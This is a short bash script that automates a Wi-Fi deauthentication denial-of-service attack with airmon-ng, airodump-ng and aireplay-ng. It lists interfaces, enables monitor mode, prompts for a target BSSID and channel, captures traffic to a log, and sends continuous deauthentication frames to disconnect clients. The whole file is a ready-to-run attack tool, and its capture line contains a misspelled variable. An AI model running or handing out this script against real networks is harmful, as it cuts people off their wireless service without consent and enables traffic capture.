#! /bin/bash

if [[ $(id -u) -ne 0 ]] ; then echo "Please run as root" ; exit 1 ; fi
COUNTER=3
echo -e "*********************************\n\tSTARTING ATTACk DOS\t\n*********************************"
echo -e "\n\n\n1)\n"
while [ $COUNTER -ne 0 ]
do
	echo -e "SHOWING INTERFACES IN :  $COUNTER\n\n\n"
	sleep 1
	((COUNTER=COUNTER -1 ))
done
iwconfig
sleep 1
echo -e "\n\n\nN.B. IF YOU HAVE ALREADY MONITOR MODE ENABLED JUST TYPE NO\n\n\n"
read -p "CHOOSE YOUR STATION : " STATION
clear
while [ $COUNTER -ne 3 ]
do
	echo -e "PRESS <CTRL-Q> WHEN YOU ARE DONE! \n\n\n"
	((COUNTER++))
done
case $STATION in

	([Nn][Oo])
		echo -e "\n\n\nNO INTERFACES TOUCHED\n\n\n"
	;;		

	(*)
		airmon-ng start $STATION	
esac

sleep 1
echo -e "\n\n\HERE THE INTERFACES AGAIN\n\n\n"
iwconfig
sleep 1
read -p "CHOOSE THE INTERFACE TO START AIRODUMP : " INTERFACE
gnome-terminal -- airodump-ng $INTERFACE
sleep 1
read -p "CHOOSE BSSID TO ATTACK : " BSSID
read -p "CHOOSE CHANNEL TO ATTACK : " CHANNEL
gnome-terminal -- airodump-ng -c $CHANNEL -w file.log  --bssid $BSSID $INTEFACE --ignore-negative-one
gnome-terminal -- aireplay-ng -0 0 -a $BSSID $INTERFACE --ignore-negative-one
echo "CTRL-Q TO EXIT AND REENABLE STATION MODE"

#airmon-ng stop $INTERFACE
#exit 0
